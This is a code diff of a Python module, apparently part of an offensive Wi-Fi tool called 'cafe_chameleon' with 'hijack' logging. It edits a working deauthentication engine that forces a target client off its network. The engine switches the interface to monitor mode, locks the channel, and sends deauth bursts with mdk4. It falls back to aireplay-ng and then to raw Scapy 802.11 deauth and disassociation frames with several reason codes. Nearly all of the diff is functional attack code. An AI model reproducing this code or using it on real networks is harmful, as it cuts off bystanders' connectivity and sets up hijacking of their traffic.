@@ -8,7 +8,7 @@ import shutil
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 
 from cafe_chameleon.utils.process import _run
-from cafe_chameleon.ui.console import log_hijack
+from cafe_chameleon.ui.console import log_hijack, set_hijack_status
 from cafe_chameleon.scanners.air_scanner import get_monitor_interface, set_monitor_mode, set_managed_mode
 
 
@@ -26,25 +26,18 @@ def is_monitor_mode_active(iface: str) -> bool:
 
 def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", count: int = 30, channel: int | None = None) -> bool:
     """
-    MDK4 Amok Deauthentication & Disassociation Engine in 802.11 Monitor Mode.
-    
-    1. Detects active monitor interface (e.g. wlan0mon). If not active, switches to monitor mode.
-    2. Tunes monitor interface to target channel using iw.
-    3. Runs mdk4 'd' (Deauth/Disassoc Amok Mode) with -b (Blacklist target client MAC) and -s (packet rate).
-    4. Falls back to aireplay-ng --deauth if mdk4 is absent/fails.
-    5. Falls back to Scapy raw 802.11 Deauth + Disassoc frame injection with reason codes (1, 2, 6, 7).
-    6. Safely restores Managed Mode if monitor mode was temporarily switched for deauth.
+    802.11 Deauthentication & Disassociation Engine in Monitor Mode.
     """
     if not target_mac or target_mac.lower() in ("ff:ff:ff:ff:ff:ff", "00:00:00:00:00:00"):
         return False
 
+    set_hijack_status(technique="802.11 Deauth Engine", clear_section2=True)
     bssid_target = bssid if bssid else "ff:ff:ff:ff:ff:ff"
     switched_monitor = False
     mon_iface = interface
 
     # 1. Ensure 802.11 Monitor Mode
     if not is_monitor_mode_active(interface):
-        log_hijack(f"[*] Switching {interface} -> MONITOR mode...")
         mon_iface = set_monitor_mode(interface)
         switched_monitor = True
     else:
@@ -52,10 +45,9 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
 
     # 2. Channel Lock
     if channel:
-        log_hijack(f"[*] Setting channel {channel} on {mon_iface}...")
         _run(f"iw dev {mon_iface} set channel {str(channel)}", debug=False)
 
-    log_hijack(f"[*] Deauthing target {target_mac} (BSSID: {bssid_target})...")
+    log_hijack("[*] Transmitting 802.11 deauthentication frames...")
 
     success = False
 
@@ -72,12 +64,11 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
             if channel:
                 cmd.extend(["-c", str(channel)])
 
-            log_hijack("[*] Dispatching MDK4 Amok deauth packets...")
             _run(cmd, debug=False, timeout=3.0)
-            log_hijack(f"\033[92m[+] MDK4 deauth sent -> {target_mac}\033[0m")
+            log_hijack("\033[92m[+] Deauth packet burst sent (MDK4)\033[0m")
             success = True
         except Exception as e:
-            log_hijack(f"[-] MDK4 error: {e}")
+            trace(f"[-] MDK4 error: {e}")
 
     # Method 2: Aireplay-ng Deauthentication Fallback
     if not success and shutil.which("aireplay-ng"):
@@ -86,10 +77,9 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
             if target_mac.lower() != "ff:ff:ff:ff:ff:ff":
                 cmd.extend(["-c", target_mac])
             cmd.append(mon_iface)
-            log_hijack("[*] Dispatching Aireplay-ng deauth packets...")
             rc, _ = _run(cmd, debug=False, timeout=4.0)
             if rc == 0:
-                log_hijack(f"\033[92m[+] Aireplay deauth sent -> {target_mac}\033[0m")
+                log_hijack("\033[92m[+] Deauth packet burst sent (Aireplay)\033[0m")
                 success = True
         except Exception:
             pass
@@ -98,7 +88,6 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
     if not success:
         try:
             from scapy.all import RadioTap, Dot11, Dot11Deauth, Dot11Disas, sendp
-            log_hijack("[*] Injecting Scapy 802.11 Deauth/Disassoc frames...")
             reason_codes = [1, 2, 6, 7]
             for reason in reason_codes:
                 pkt_deauth = RadioTap() / Dot11(addr1=target_mac, addr2=bssid_target, addr3=bssid_target) / Dot11Deauth(reason=reason)
@@ -107,14 +96,13 @@ def send_deauth(target_mac: str, bssid: str | None, interface: str = "wlan0", co
                 sendp(pkt_deauth, iface=mon_iface, count=10, inter=0.005, verbose=False)
                 sendp(pkt_disas, iface=mon_iface, count=10, inter=0.005, verbose=False)
 
-            log_hijack(f"\033[92m[+] Scapy deauth injected -> {target_mac}\033[0m")
+            log_hijack("\033[92m[+] Deauth frames injected (Scapy)\033[0m")
             success = True
         except Exception as e:
             log_hijack(f"[-] Deauth error: {e}")
 
     # 3. Restore Managed Mode if temporarily switched
     if switched_monitor:
-        log_hijack(f"[*] Restoring {interface} -> MANAGED mode...")
         set_managed_mode(interface)
 
     return success
